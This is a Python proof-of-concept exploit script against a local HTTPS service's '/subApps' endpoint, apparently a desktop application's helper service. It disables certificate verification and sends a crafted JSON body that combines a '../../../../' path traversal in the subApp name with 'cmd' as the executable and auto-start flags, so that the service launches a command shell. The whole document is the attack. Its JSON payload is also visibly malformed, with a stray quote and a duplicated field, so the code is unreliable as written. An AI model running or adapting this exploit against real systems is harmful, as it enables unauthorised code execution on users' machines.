

import socket
import time
import ssl
SERVER_IP = "127.0.0.1"
SERVER_PORT = 57632
#required headers:
#POST /subApps - creates a subApp from the payload
#POST /subApps/status - will enable and execute the subApp
MESSAGE = b"POST /subApps HTTP/1.1\r\nHost: 127.0.0.1:64277\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)\r\n" \
          b"Content-Type: application/json\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nConnection: Keep-Alive"
#name - subApp path to execute
#isEnabled - tries to enable and execute the subApp
#executableName - the binary to execute from the path
payload = b"\r\n\r\n{\"name\":\"../../../../Users/test/test/",\"isEnabled\":true}" \
          b"\"isEnabled\":true,\"isReady\":true," \
          b"\"isRunning\":false,\"shouldAutoStart\":true,\"isWindowsSupported\":true,\"toggleViaSettings\":true" \
          b",\"executableName\":\"cmd\"}"
if __name__ == '__main__':
    print("Server target IP:", SERVER_IP)
    print("Server target port:", SERVER_PORT)
    Content_Length = f"\r\nContent-Length: {len(payload)-4}"
    MESSAGE = MESSAGE + bytes(Content_Length,"utf-8") + payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', SERVER_PORT)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    print (f"connecting to server...")
    ssock = context.wrap_socket(sock, server_hostname=SERVER_IP)
    ssock.connect((SERVER_IP,SERVER_PORT))
    ssock.settimeout(30)
    print("connected!")
    ssock.send(MESSAGE)
    try:
        print(f"Answer :{ssock.recv(1024)}")
        exit(1)
    except:
        pass
